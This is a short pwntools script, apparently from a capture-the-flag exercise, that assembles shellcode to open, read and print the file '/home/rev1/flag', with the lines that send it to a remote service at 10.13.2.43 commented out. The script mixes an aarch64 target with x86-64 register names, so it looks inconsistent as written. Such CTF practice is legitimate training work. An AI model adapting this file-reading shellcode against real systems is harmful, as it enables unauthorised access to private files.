#!/usr/bin/env python2
from pwn import *
from IPython import embed

context.update(os='linux', arch='aarch64')
#context.update(os='linux', arch='amd64')

#r = remote('10.13.2.43', 10739)

s = ''
s += shellcraft.pushstr('/home/rev1/flag')
s += shellcraft.open('rsp', constants.O_RDONLY)
s += shellcraft.mov('r12', 'rax')
s += 'here:'
s += shellcraft.read('r12', 'rsp', 41)
s += shellcraft.write(1, 'rsp', 'rax')
s += 'jmp here'

#embed()

#r.sendline(asm(s))
print asm(s)

#r.interactive()

